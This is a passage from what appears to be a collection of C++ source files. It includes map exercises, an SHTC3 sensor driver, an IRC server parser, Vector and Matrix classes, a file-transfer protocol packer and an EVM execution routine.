{25, 6.01}, {-9, 3.2}, {12, 5.16}};\n // 2. Output each pair of the map\n cout << \"Original map:\\n\";\n outputMap(myMap);\n // 3. Insert a new pair (3, 3.75) and display resulting map\n myMap.insert(make_pair(3, 3.75));\n cout << \"\\nMap after inserting (3, 3.75):\\n\";\n outputMap(myMap);\n // 4. Insert a new pair (-10, 4.3) and display resulting map\n myMap.insert(make_pair(-10, 4.3));\n cout << \"\\nMap after inserting (-10, 4.3):\\n\";\n outputMap(myMap);\n // 5. Using method .find(), find key 12, store result inside iterator it and print\nthe value\n auto it = myMap.find(12);\n if (it != myMap.end()) {\n cout << \"\\nThe value corresponding to key 12 is: \" << it->second << endl;\n } else {\n cout << \"\\nKey 12 not found in the map.\\n\";\n }\n // 6. Using the same iterator, delete pair with key 12 and print resulting map\n if (it != myMap.end()) {\n myMap.erase(it);\n cout << \"\\nMap after deleting pair with key 12:\\n\";\n outputMap(myMap);\n }\n // 7. Modify a value whose key is -9 to 4.44 and print resulting map\n it = myMap.find(-9);\n if (it != myMap.end()) {\n it->second = 4.44;\n cout << \"\\nMap after modifying value with key -9 to 4.44:\\n\";\n outputMap(myMap);\n }\n std::cout<<\"Problem_5\"<<std::endl;\n // 1. Create an unordered map with the given pairs\n unordered_map<string, int> myMap1 = {{\"Earth\", 3}, {\"Mercury\", 1}, {\"Venus\", 2}};\n // 2. Display all pairs of the map\n displayPairs(myMap1);\n // 3. Insert a pair (\"Mars\", 4) int",
    "#include \"TempSensor.h\"\n\nstatic const char *TAG = \"SHTC3\";\n\n// I2C Configuration Parameters\n#define I2C_MASTER_SCL_IO 8\n#define I2C_MASTER_SDA_IO 10\n#define I2C_MASTER_NUM I2C_NUM_0\n#define I2C_MASTER_FREQ_HZ 100000\n#define I2C_MASTER_TX_BUF_DISABLE 0\n#define I2C_MASTER_RX_BUF_DISABLE 0\n#define SHTC3_SENSOR_ADDR 0x70\n#define WRITE_BIT I2C_MASTER_WRITE\n#define READ_BIT I2C_MASTER_READ\n#define ACK_CHECK_EN 0x1\n#define ACK_CHECK_DIS 0x0\n#define ACK_VAL 0x0\n#define NACK_VAL 0x1\n\nuint8_t gencrc(uint8_t *data, size_t len) {\n  uint8_t crc = 0xff;\n  size_t i, j;\n  for (i = 0; i < len; i++) {\n    crc ^= data[i];\n    for (j = 0; j < 8; j++) {\n      if ((crc & 0x80) != 0)\n        crc = (uint8_t)((crc << 1) ^ 0x31);\n      else\n        crc <<= 1;\n    }\n  }\n  return crc;\n}\n\nesp_err_t read_temperature(float *temperature) {\n  uint8_t data[3];\n  esp_err_t ret;\n\n  i2c_cmd_handle_t cmd = i2c_cmd_link_create();\n  i2c_master_start(cmd);\n  i2c_master_write_byte(cmd, (SHTC3_SENSOR_ADDR << 1) | WRITE_BIT,\n                        ACK_CHECK_EN);\n  i2c_master_write_byte(cmd, 0x7C, ACK_CHECK_EN);\n  i2c_master_write_byte(cmd, 0xA2, ACK_CHECK_EN);\n  i2c_master_stop(cmd);\n  ret = i2c_master_cmd_begin(I2C_MASTER_NUM, cmd, 1000 / portTICK_PERIOD_MS);\n  i2c_cmd_link_delete(cmd);\n  if (ret != ESP_OK) {\n    return ret;\n  }\n\n  vTaskDelay(20 / portTICK_PERIOD_MS);\n\n  cmd = i2c_cmd_link_create();\n  i2c_master_start(cmd);\n  i2c_master_write_byte(cmd, (SHTC3_SENSOR_ADDR << 1) | READ_BIT, ACK_CHECK_EN);\n  i2c_master_read_byte(cmd, &data[0], (i2c_ack_type_t)ACK_VAL);\n  i2c_master_read_byte(cmd, &data[1], (i2c_ack_type_t)ACK_VAL);\n  i2c_master_read_byte(cmd, &data[2], (i2c_ack_type_t)NACK_VAL);\n  i2c_master_stop(cmd);\n  ret = i2c_master_cmd_begin(I2C_MASTER_NUM, cmd, 1000 / portTICK_PERIOD_MS);\n  i2c_cmd_link_delete(cmd);\n  if (ret != ESP_OK) {\n    return ret;\n  }\n\n  uint8_t checksum = gencrc(data, 2);\n  if (checksum != data[2]) {\n    ESP_LOGE(TAG, \"Temperature checksum error: expected 0x%02X, got 0x%02X\",\n             checksum, data[2]);\n    return ESP_FAIL;\n  }\n\n  float temp_raw = (data[0] << 8) | data[1];\n  *temperature = -45 + (175.0 * temp_raw / 65536.0);\n  return ESP_OK;\n}\n\nesp_err_t read_humidity(float *humidity) {\n  uint8_t data[3];\n  esp_err_t ret;\n\n  // Trigger humidity measurement\n  i2c_cmd_handle_t cmd = i2c_cmd_link_create();\n  i2c_master_start(cmd);\n  i2c_master_write_byte(cmd, (SHTC3_SENSOR_ADDR << 1) | WRITE_BIT,\n                        ACK_CHECK_EN);\n  i2c_master_write_byte(cmd, 0x5C, ACK_CHECK_EN);\n  i2c_master_write_byte(cmd, 0x24, ACK_CHECK_EN);\n  i2c_master_stop(cmd);\n  ret = i2c_master_cmd_begin(I2C_MASTER_NUM, cmd, 1000 / portTICK_PERIOD_MS);\n  i2c_cmd_link_delete(cmd);\n\n  if (ret != ESP_OK) {\n    return ret;\n  }\n\n  vTaskDelay(20 / portTICK_PERIOD_MS);\n\n  // Read the sensor data\n  cmd = i2c_cmd_link_create();\n  i2c_master_start(cmd);\n  i2c_master_write_byte(cmd, (SHTC3_SENSOR_ADDR << 1) | READ_BIT, ACK_CHECK_EN);\n  i2c_master_read_byte(cmd, &data[0], (i2c_ack_type_t)ACK_VAL);\n  i2c_master_read_byte(cmd, &data[1], (i2c_ack_type_t)ACK_VAL);\n  i2c_master_read_byte(cmd, &data[2], (i2c_ack_type_t)NACK_VAL);\n  i2c_master_stop(cmd);\n  ret = i2c_master_cmd_begin(I2C_MASTER_NUM, cmd, 1000 / portTICK_PERIOD_MS);\n  i2c_cmd_link_delete(cmd);\n\n  if (ret != ESP_OK) {\n    return ret;\n  }\n\n  uint8_t checksum = gencrc(data, 2);\n  if (checksum != data[2]) {\n    ESP_LOGE(TAG, \"humidity checksum error: expected 0x%02X, got 0x%02X\",\n             checksum, data[2]);\n    return ESP_FAIL;\n  }\n\n  float humi_raw = (data[0] << 8) | data[1];\n  *humidity = 100.0 * humi_raw / 65536.0;\n\n  return ESP_OK;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_native_splash_screen\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"Irc.hpp\"\n#include \"Server.hpp\"\n#include \"Commands.hpp\"\n\nstatic void splitMessage(std::vector<std::string> &cmds, std::string msg)\n{\n\tint pos = 0;\n\tstd::string delimiter = \"\\n\";\n\tstd::string substr;\n\n\twhile ((pos = msg.find(delimiter)) != static_cast<int>(std::string::npos))\n\t{\n\t\tsubstr = msg.substr(0, pos);\n\t\tcmds.push_back(substr);\n\t\tmsg.erase(0, pos + delimiter.length());\n\t}\n}\n\nvoid Server::fillClients(std::map<const int, Client> &client_list, int client_fd, std::string cmd)\n{\n\tstd::map<const int, Client>::iterator it = client_list.find(client_fd);\n\tcmd_struct cmd_infos;\n\tif (parseCommand(cmd, cmd_infos) == FAILURE)\n\t\treturn ;\n\n\tif (cmd.find(\"NICK\") != std::string::npos)\n\t\tnick(this, client_fd, cmd_infos);\n\telse if (cmd.find(\"USER\") != std::string::npos)\n\t\tuser(this, client_fd, cmd_infos);\n\telse if (cmd.find(\"PASS\") != std::string::npos)\n\t{\n\t\tif (pass(this, client_fd, cmd_infos) == SUCCESS)\n\t\t\tit->second.setConnexionPassword(true);\n\t\telse\n\t\t\tit->second.setConnexionPassword(false);\n\t}\n}\n\nvoid Server::execCommand(int const client_fd, std::string cmd_line)\n{\n\tstd::string\tvalidCmds[VALID_LEN] = {\n\t\t\"INVITE\",\n\t\t\"JOIN\",\n\t\t\"KICK\",\n\t\t\"KILL\",\n\t\t\"LIST\",\n\t\t\"MODE\",\n\t\t\"MOTD\",\n\t\t\"NAMES\",\n\t\t\"NICK\",\n\t\t\"NOTICE\",\n\t\t\"OPER\",\n\t\t\"PART\",\n\t\t\"PING\",\n\t\t\"PRIVMSG\",\n\t\t\"QUIT\",\n\t\t\"TOPIC\",\n\t\t\"USER\",\n\t\t};\n\n\tClient *client = getClient(this, client_fd);\n\tcmd_struct cmd_infos;\n\tint index = 0;\n\n\tif (parseCommand(cmd_line, cmd_infos) == FAILURE)\n\t\treturn ;\n\n\twhile (index < VALID_LEN)\n\t{\n\t\tif (cmd_infos.name == validCmds[index])\n\t\t\tbreak;\n\t\tindex++;\n\t}\n\n\tswitch (index + 1)\n\t{\n\t\tcase 1: invite(this, client_fd, cmd_infos); break;\n\t\tcase 2: join(this, client_fd, cmd_infos); break;\n\t\tcase 3: kick(this, client_fd, cmd_infos); break;\n\t\tcase 4: kill(this, client_fd, cmd_infos); break;\n\t\tcase 5: list(this, client_fd, cmd_infos); break;\n\t\tcase 6: modeFunction(this, client_fd, cmd_infos); break;\n\t\tcase 7: motd(this, client_fd, cmd_infos); break;\n\t\tcase 8: names(this, client_fd, cmd_infos); break;\n\t\tcase 9: nick(this, client_fd, cmd_infos); break;\n    \tcase 10: notice(this, client_fd, cmd_infos); break;\n\t\tcase 11: oper(this, client_fd, cmd_infos); break;\n\t\tcase 12: part(this, client_fd, cmd_infos); break;\n\t\tcase 13: ping(this, client_fd, cmd_infos); break;\n\t\tcase 14: privmsg(this, client_fd, cmd_infos); break;\n\t\tcase 15: quit(this, client_fd, cmd_infos); break;\n\t\tcase 16: topic(this, client_fd, cmd_infos); break;\n\t\tcase 17: user(this, client_fd, cmd_infos); break;\n\t\tdefault:\n\t\t\taddToClientBuffer(this, client_fd, ERR_UNKNOWNCOMMAND(client->getNickname(), cmd_infos.name));\n\t}\n}\n\nvoid Server::parseMessage(int const client_fd, std::string message)\n{\n\tstd::vector<std::string>\t\t\t\tcmds;\n\tstd::map<const int, Client>::iterator\tit = _clients.find(client_fd);\n\n\tsplitMessage(cmds, message);\n\n\tfor (size_t i = 0; i != cmds.size(); i++)\n\t{\n\t\tif (it->second.isRegistrationDone() == false)\n\t\t{\n\t\t\tif (it->second.hasAllInfo() == false)\n\t\t\t{\n\t\t\t\tfillClients(_clients, client_fd, cmds[i]);\n\t\t\t\tif (it->second.getNbInfo() == 3)\n\t\t\t\t\tit->second.hasAllInfo() = true;\n\t\t\t}\n\t\t\tif (it->second.hasAllInfo() == true && it->second.isWelcomeSent() == false)\n\t\t\t{\n\t\t\t\tif (it->second.is_valid() == SUCCESS)\n\t\t\t\t{\n\t\t\t\t\tsendClientRegistration(this, client_fd, it);\n\t\t\t\t\tit->second.isWelcomeSent() = true;\n\t\t\t\t\tit->second.isRegistrationDone() = true;\n\t\t\t\t}\t\t\n\t\t\t\telse\n\t\t\t\t\tthrow Server::InvalidClientException();\n\t\t\t}\n\t\t}\n\t\telse\n\t\t\texecCommand(client_fd, cmds[i]);\n\t}\n}\n\n/**\n * @brief \n * \n * \texple de ligne : @id=234AB :dan!d@localhost PRIVMSG #chan :Hey what's up!\n *  autre exple : /ping localhost devient : PRIVMSG localhost :PING 1671195504 289728\n * \n */\nint\tparseCommand(std::string cmd_line, cmd_struct &cmd_infos)\n{\n\tif (cmd_line.empty() == true)\n\t\treturn (FAILURE);\n\t\n\t// COMMAND\n\tstd::string copy = cmd_line;\n\tif (cmd_line[0] == ':')\t// Cas du pr\u00e9fixe (supprimer cette partie d'une copy) pour retomber sur un cas \"CMD arg <arg2>\" ou \"CMD\"\n\t{\n\t\tif (cmd_line.find_first_of(' ') != std::string::npos)\n\t\t\tcopy.erase(0, copy.find_first_of(' ') + 1);\n\t}\n\t\n\tif (copy.find_first_of(' ') == std::string::npos) // Cas d'une commande \"NICK\" ou \":prefixe NICK\" sans arguments\n\t{\n\t\tcmd_infos.name.insert(0, copy, 0, std::string::npos);\n\t\tif (cmd_infos.name.find('\\r') != std::string::npos) // effacer le \\r\\n, vu que dans ce cas on copie jusqu'\u00e0 la fin\n\t\t\tcmd_infos.name.erase(cmd_infos.name.find('\\r'), 1); \n\t}\n\telse\n\t\tcmd_infos.name.insert(0, copy, 0, copy.find_first_of(' ')); // Cas d'une commande \"NICK arg1\" : on copie jusqu'\u00e0 l'espace\n\n\t// PREFIX\n\tsize_t prefix_length = cmd_line.find(cmd_infos.name, 0);\n\tcmd_infos.prefix.assign(cmd_line, 0, prefix_length);\n\n\t// MESSAGE\n\tsize_t msg_beginning = cmd_line.find(cmd_infos.name, 0) + cmd_infos.name.length();\n\tcmd_infos.message = cmd_line.substr(msg_beginning, std::string::npos);\n\tcmd_infos.message.erase(cmd_infos.message.find(\"\\r\"), 1);\n\n\tfor (size_t i = 0; i < cmd_infos.name.size(); i++)\n\t\tcmd_infos.name[i] = std::toupper(cmd_infos.name[i]);\n\t\n\t// DEBUG\n\t// std:",
    "#include \"Vector.h\"\n#include <cstring>\n\nVector::Vector() : arr(nullptr), size(0) {}\n\nVector::Vector(int n) : arr(new int[n]), size(n) {}\n\nVector::Vector(const int* a, int n) : arr(new int[n]), size(n) {\n    std::memcpy(arr, a, n * sizeof(int));\n}\n\nVector::Vector(const Vector& v) : arr(new int[v.size]), size(v.size) {\n    std::memcpy(arr, v.arr, v.size * sizeof(int));\n}\n\nVector::Vector(Vector&& v) noexcept : arr(v.arr), size(v.size) {\n    v.arr = nullptr;\n    v.size = 0;\n}\n\nVector::~Vector() {\n    delete[] arr;\n}\n\nint Vector::getSize() const {\n    return size;\n}\n\n\nconst int& Vector::operator[](int i) const {\n    return arr[i];\n}\n\nVector& Vector::operator=(const Vector& v) {\n    if (this != &v) {\n        delete[] arr;\n        arr = new int[v.size];\n        size = v.size;\n        std::memcpy(arr, v.arr, v.size * sizeof(int));\n    }\n    return *this;\n}\n\nVector& Vector::operator=(Vector&& v) noexcept {\n    if (this != &v) {\n        delete[] arr;\n        arr = v.arr;\n        size = v.size;\n        v.arr = nullptr;\n        v.size = 0;\n    }\n    return *this;\n}\n\nstd::ostream& operator<<(std::ostream& os, const Vector& v) {\n    for (int i = 0; i < v.size; i++) {\n        os << v.arr[i] << \" \";\n    }\n    return os;\n}\n\nstd::istream& operator>>(std::istream& is, Vector& v) {\n    int n;\n    is >> n;\n    int* a = new int[n];\n    for (int i = 0; i < n; i++) {\n        is >> a[i];\n    }\n    delete[] v.arr;\n    v.arr = a;\n    v.size = n;\n    return is;\n}\n\nbool Vector::operator<(const Vector& v) const {\n    int minSize = size < v.size ? size : v.size;\n    for (int i = 0; i < minSize; i++) {\n        if (arr[i] < v.arr[i]) {\n            return true;\n        }\n        else if (arr[i] > v.arr[i]) {\n            return false;\n        }\n    }\n    return size < v.size;\n}\n",
    "\n#include \"protocol.h\"\n\nstd::map<std::string, uint16_t> requestCodes = {\n\t\t{\"registration\", 1025},\n\t\t{\"send_public_key\", 1026},\n\t\t{\"login\", 1027},\n\t\t{\"send_file\", 1028},\n\t\t{\"CRC_ok\", 1029},\n\t\t{\"CRC_resend\", 1030},\n\t\t{\"CRC_bad\", 1031}\n};\n\n\nstd::map<uint16_t, std::string> statusCodes = {\n\t {1600, \"registration_success\"},\n\t {1601, \"registration_failed\"},\n\t {1602, \"sending_AES\"},\n\t {1603, \"accepted_file\"},\n\t {1604, \"msg_accepted\"},\n\t {1605, \"login_ok_sending_AES\"},\n\t {1606, \"login_rejected\"},\n\t {1607, \"server_error\"}\n};\n\nRequest::Request(RequestHeader header) : header(header) {}\n\n\nRequestHeader::RequestHeader(std::string client_id, uint8_t client_version, uint16_t code, uint32_t payload_size) : code(code), client_version(client_version), payload_size(payload_size) {\n\tthis->client_id = client_id;\n}\n\nvoid RequestHeader::pack_for_sending(std::vector<uint8_t>& packet) {\n\n\tpacket.insert(packet.end(), this->client_id.begin(), this->client_id.end());\n\n\tpacket.push_back(this->client_version);\n\n\tuint8_t buffer16[2];\n\tmemcpy_s(buffer16, sizeof(buffer16), &(this->code), sizeof(uint16_t));\n\tpacket.insert(packet.end(), buffer16, buffer16 + sizeof(uint16_t));\n\n\tuint8_t buffer32[4];\n\tmemcpy_s(buffer32, sizeof(buffer32), &payload_size, sizeof(uint32_t));\n\tpacket.insert(packet.end(), buffer32, buffer32 + sizeof(uint32_t));\n}\n\n\n\n\nResponseHeader::ResponseHeader(uint8_t version, uint16_t code, uint32_t payload_size) : code(code), server_version(version), payload_size(payload_size) {}\n\nResponseHeader unpack_recieved_header(std::vector<uint8_t>& packet) {\n\tuint8_t server_version;\n\tserver_version = packet[0];\n\tuint16_t response_code;\n\tmemcpy(&response_code, &packet[SIZE_OF_VERSION_FIELD], sizeof(uint16_t));\n\tuint32_t payload_size;\n\tmemcpy(&payload_size, &packet[SIZE_OF_VERSION_FIELD + SIZE_OF_CODE_FIELD], sizeof(uint32_t));\n\tResponseHeader header(server_version, response_code, payload_size);\n\treturn header;\n}\n\n\n\nRegistrationRequest::RegistrationRequest(RequestHeader header, std::string name) : Request(header), client_name(name) {}\n\nvoid RegistrationRequest::pack_for_sending(std::vector<uint8_t>& packet) {\n\tthis->header.pack_for_sending(packet);\n\tstd::string client_name_field = this->client_name;\n\tprepare_payload_for_sending(client_name_field, SIZE_OF_CLIENT_NAME);\n\tpacket.insert(packet.end(), client_name_field.begin(), client_name_field.end());\n}\n\nLoginRequest::LoginRequest(RequestHeader header, std::string name) : Request(header), client_name(name) {}\n\nvoid LoginRequest::pack_for_sending(std::vector<uint8_t>& packet) {\n\tthis->header.pack_for_sending(packet);\n\tstd::string client_name_field = this->client_name;\n\tprepare_payload_for_sending(client_name_field, SIZE_OF_CLIENT_NAME);\n\tpacket.insert(packet.end(), client_name_field.begin(), client_name_field.end());\n}\n\nPublicKeyRequest::PublicKeyRequest(RequestHeader header, std::string name, std::string key) : Request(header), client_name(name), public_key(key) {}\n\nvoid PublicKeyRequest::pack_for_sending(std::vector<uint8_t>& packet) {\n\tthis->header.pack_for_sending(packet);\n\n\tstd::string client_name_field = this->client_name;\n\tstd::string public_key_field = this->public_key;\n\n\tprepare_payload_for_sending(client_name_field, SIZE_OF_CLIENT_NAME);\n\tpacket.insert(packet.end(), client_name_field.begin(), client_name_field.end());\n\tpacket.insert(packet.end(), public_key_field.begin(), public_key_field.end());\n}\n\nSendingFileRequest::SendingFileRequest(RequestHeader header, uint32_t content_size, uint32_t original_file_size, uint16_t packet_number, uint16_t total_packets, std::string file_name, std::string message_content) :\n\tRequest(header), content_size(content_size), original_file_size(original_file_size), packet_number(packet_number), total_packets(total_packets), file_name(file_name), message_content(message_content){}\n\nvoid SendingFileRequest::pack_for_sending(std::vector<uint8_t>& packet) {\n\tthis->header.pack_for_sending(packet);\n\n\tuint8_t content_size_buffer[4];\n\tmemcpy_s(content_size_buffer, sizeof(content_size_buffer), &(this->content_size), sizeof(uint32_t));\n\tpacket.insert(packet.end(), content_size_buffer, content_size_buffer + sizeof(uint32_t));\n\t\n\tuint8_t original_file_size_buffer[4];\n\tmemcpy_s(original_file_size_buffer, sizeof(original_file_size_buffer), &(this->original_file_size), sizeof(uint32_t));\n\tpacket.insert(packet.end(), original_file_size_buffer, original_file_size_buffer + sizeof(uint32_t));\n\n\tuint8_t packet_number_buffer[2];\n\tmemcpy_s(packet_number_buffer, sizeof(packet_number_buffer), &(this->packet_number), sizeof(uint16_t));\n\tpacket.insert(packet.end(), packet_number_buffer, packet_number_buffer + sizeof(uint16_t));\n\n\tuint8_t total_packets_buffer[2];\n\tmemcpy_s(total_packets_buffer, sizeof(total_packets_buffer), &(this->total_packets), sizeof(uint16_t));\n\tpacket.insert(packet.end(), total_packets_buffer, total_packets_buffer + sizeof(uint16_t));\n\n\tstd::string file_name_field = this->file_name;\n\tprepare_payload_for_sending(file_name_field, SIZE_OF_FILE_NAME);\n\tpacket.",
    "// evmweak: Fast Ethereum Virtual Machine implementation\n// Copyright 2019 The evmweak Authors.\n// SPDX-License-Identifier: Apache-2.0\n\n#include \"advanced_execution.hpp\"\n#include \"advanced_analysis.hpp\"\n#include \"eof.hpp\"\n#include <memory>\n\nnamespace evmweak::advanced\n{\nevmc_result execute(AdvancedExecutionState& state, const AdvancedCodeAnalysis& analysis) noexcept\n{\n    state.analysis.advanced = &analysis;  // Allow accessing the analysis by instructions.\n\n    const auto* instr = state.analysis.advanced->instrs.data();  // Get the first instruction.\n    while (instr != nullptr)\n        instr = instr->fn(instr, state);\n\n    const auto gas_left =\n        (state.status == EVMC_SUCCESS || state.status == EVMC_REVERT) ? state.gas_left : 0;\n    const auto gas_refund = (state.status == EVMC_SUCCESS) ? state.gas_refund : 0;\n\n    assert(state.output_size != 0 || state.output_offset == 0);\n    return evmc::make_result(state.status, gas_left, gas_refund,\n        state.memory.data() + state.output_offset, state.output_size);\n}\n\nevmc_result execute(evmc_vm* /*unused*/, const evmc_host_interface* host, evmc_host_context* ctx,\n    evmc_revision rev, const evmc_message* msg, const uint8_t* code, size_t code_size) noexcept\n{\n    AdvancedCodeAnalysis analysis;\n    const bytes_view container = {code, code_size};\n    if (is_eof_container(container))\n    {\n        if (rev >= EVMC_CANCUN)\n        {\n            const auto eof1_header = read_valid_eof1_header(container);\n            analysis = analyze(rev, eof1_header.get_code(container, 0));\n        }\n        else\n            // Skip analysis, because it will recognize 01 section id as OP_ADD and return\n            // EVMC_STACKUNDERFLOW.\n            return evmc::make_result(EVMC_UNDEFINED_INSTRUCTION, 0, 0, nullptr, 0);\n    }\n    else\n        analysis = analyze(rev, container);\n    auto state = std::make_unique<AdvancedExecutionState>(*msg, rev, *host, ctx, container);\n    return execute(*state, analysis);\n}\n}  // namespace evmweak::advanced\n",
    "#include<iostream>\n#include\"Matrix.hpp\"\nusing namespace std;\nMatrix::Matrix()\n{\n\trows = 1;\n\tcolumns = 1;\n\tmacierz = new double* [rows];\n\tfor (int i = 0; i < rows; i++)\n\t{\n\t\tmacierz[i] = new double[columns];\n\t\tfor (int j = 0; j < columns; j++)\n\t\t{\n\t\t\tmacierz[i][j] = 0.0;\n\t\t}\n\t}\n\n}\nMatrix::Matrix(unsigned int p_rows, unsigned int p_columns) :rows(p_rows), columns(p_columns)\n{\n\t//Wykorzystanie dynamicznej alokacji pamieci na macierz\n\tmacierz = new double* [rows];\n\tfor (int i = 0; i < rows; i++)\n\t{\n\t\tmacierz[i] = new double[columns];\n\t\tfor (int j = 0; j < columns; j++)\n\t\t{\n\t\t\tmacierz[i][j] = 0;\n\t\t}\n\t}\n\n\n}\nvoid Matrix::wypelnij()\n{\n\tdouble wartosc_podana;\n\tfor (int i = 0; i < rows; i++)\n\t{\n\t\tfor (int j = 0; j < columns; j++)\n\t\t{\n\t\t\tcout << \"Podaj wartosc elementu z \" << i + 1 << \" rzedu \" << j + 1 << \" kolumny\";\n\t\t\twhile (!(cin >> wartosc_podana))\n\t\t\t{\n\t\t\t\tcout << \"Blad! To nie jest liczba zmiennoprzecinkowa. Podaj liczbe ponownie: \";\n\t\t\t\tcin.clear();\n\t\t\t\tcin.ignore(numeric_limits<streamsize>::max(), '\\n');\n\t\t\t}\n\t\t\tmacierz[i][j] = wartosc_podana;\n\t\t}\n\t}\n}\nvoid Matrix::print()\n{\n\tfor (int i = 0; i < rows; i++)\n\t{\n\t\tfor (int j = 0; j < columns; j++)\n\t\t{\n\t\t\tcout << macierz[i][j] << \" \";\n\t\t}\n\t\tcout << endl;\n\t}\n}\nunsigned int Matrix::rowsAmount()\n{\n\treturn rows;\n}\nunsigned int Matrix::columnsAmount()\n{\n\treturn columns;\n}\nvoid Matrix::setElement(unsigned int p_row, unsigned int p_columns, double value)\n{\n\tmacierz[p_row][p_columns] = value;\n}\ndouble Matrix::getElement(unsigned int p_row, unsigned int p_column)\n{\n\treturn macierz[p_row][p_column];\n}\ndouble Matrix::det()\n{\n\tif (rows == columns)\n\t{\n\t\tdouble determinant = 0.0;\n\t\tif (rows == 1)\n\t\t{\n\t\t\tdeterminant = macierz[0][0];\n\t\t}\n\t\telse if (rows == 2)\n\t\t{\n\t\t\tdeterminant = macierz[0][0] * macierz[1][1] - macierz[0][1] * macierz[1][0];\n\t\t}\n\t\telse//Gdy rozmiar maciezy jest wieksza niz 2 trzeba zastosowa\u00e6 laplaca\n\t\t{\n\t\t\tfor (int j = 0; j < columns; j++)\n\t\t\t{\n\t\t\t\tMatrix podmacierz(rows - 1, columns - 1);\n\n\t\t\t\tfor (int i = 1; i < rows; i++)\n\t\t\t\t{\n\t\t\t\t\tfor (int k = 0, l = 0; k < columns; k++)\n\t\t\t\t\t{\n\t\t\t\t\t\tif (k == j) continue;\n\t\t\t\t\t\tpodmacierz.setElement(i - 1, l++, macierz[i][k]);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tif (j % 2 == 0) {\n\t\t\t\t\tdeterminant = determinant + macierz[0][j] * podmacierz.det();\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tdeterminant = determinant - macierz[0][j] * podmacierz.det();\n\t\t\t\t}\n\n\t\t\t}\n\t\t}\n\t\treturn determinant;\n\t}\n\telse\n\t{\n\t\tcout<< \"Nie da sie wyznaczyc wyznacznika dla macierzy niekwadratowej.\" << std::endl;\n\t\treturn 0.0;\n\t}\n}\n\nMatrix::~Matrix()\n{\n\tfor (int i = 0; i < rows; i++)\n\t\tdelete[] macierz[i];\n}\nMatrix Matrix::operator+(Matrix& other) {\n\tif (this->columnsAmount() == other.columnsAmount() && this->rowsAmount() == other.rowsAmount())\n\t{\n\t\tcout << \"Ma tyle samo kolumn\" << endl;\n\t\tMatrix return_matrix(this->rowsAmount(), this->columnsAmount());\n\t\tfor (int i = 0; i < other.rowsAmount(); i++)\n\t\t{\n\t\t\tfor (int j = 0; j < other.columnsAmount(); j++)\n\t\t\t{\n\t\t\t\treturn_matrix.setElement(i, j, this->getElement(i, j) + other.getElement(i, j));\n\t\t\t}\n\t\t}\n\t\treturn return_matrix;\n\t}\n\telse\n\t{\n\t\tcout << \"Nie ma tyle samo kolumn\" << endl;\n\t\tthrow exception();\n\t}\n}\nMatrix Matrix::operator-(Matrix& other) {\n\tif (this->columnsAmount() == other.columnsAmount() && this->rowsAmount() == other.rowsAmount())\n\t{\n\t\tcout << \"Ma tyle samo kolumn\" << endl;\n\t\tMatrix return_matrix(this->rowsAmount(), this->columnsAmount());\n\t\tfor (int i = 0; i < other.rowsAmount(); i++)\n\t\t{\n\t\t\tfor (int j = 0; j < other.columnsAmount(); j++)\n\t\t\t{\n\t\t\t\treturn_matrix.setElement(i, j, this->getElement(i, j) - other.getElement(i, j));\n\t\t\t}\n\t\t}\n\t\treturn return_matrix;\n\t}\n\telse\n\t{\n\t\tcout << \"Nie ma tyle samo kolumn\" << endl;\n\t\tthrow exception();\n\t}\n}\nMatrix Matrix::operator*(Matrix& other) {\n\tif (this->columnsAmount() == other.rowsAmount())\n\t{\n\t\tdouble new_element;\n\t\t//cout << \"Mozna przemnozyc\" << endl;\n\t\tMatrix return_matrix(this->rowsAmount(), other.columnsAmount());\n\t\tfor (int i = 0; i < this->rowsAmount(); i++)\n\t\t{\n\t\t\tfor (int j = 0; j < other.columnsAmount(); j++)\n\t\t\t{\n\t\t\t\tnew_element = 0;\n\t\t\t\tfor (int b = 0; b < other.rowsAmount(); b++)\n\t\t\t\t{\n\t\t\t\t\tnew_element = new_element + (this->getElement(i, b) * other.getElement(b, j));\n\t\t\t\t}\n\t\t\t\treturn_matrix.setElement(i, j, new_element);\n\t\t\t}\n\t\t}\n\t\treturn return_matrix;\n\t}\n\telse\n\t{\n\t\tcout << \"Nie ma tyle samo kolumn\" << endl;\n\t\tthrow exception();\n\t}\n}\nvoid Matrix::transpozycja()\n{\n\t//Tworzenie nowego bloku\n\tdouble** new_macierz;\n\tint p_columns = rows;\n\tint p_rows = columns;\n\n\tnew_macierz = new double* [p_rows];\n\tfor (int i = 0; i < p_rows; i++)\n\t{\n\t\tnew_macierz[i] = new double[p_columns];\n\t\tfor (int j = 0; j < p_columns; j++)\n\t\t{\n\t\t\tnew_macierz[i][j] = macierz[j][i];\n\t\t}\n\t}\n\tfor(int i=0; i<rows; i++)\n\t\tdelete[] macierz[i];\n\n\tmacierz = new double* [p_rows];\n\tfor (int i = 0; i < p_rows; i++)\n\t{\n\t\tmacierz[i] = new double[p_columns];\n\t\tfor (int j = 0; j < p_columns; j++)\n\t\t{\n\t\t\tmacierz[i][j] = new_macierz[i][j];\n\t\t}\n\t}\n\trows = p_rows;\n\tcolumns = p_columns;\n\tfor (int i = 0; i < rows; i++)\n\t\tdelet",
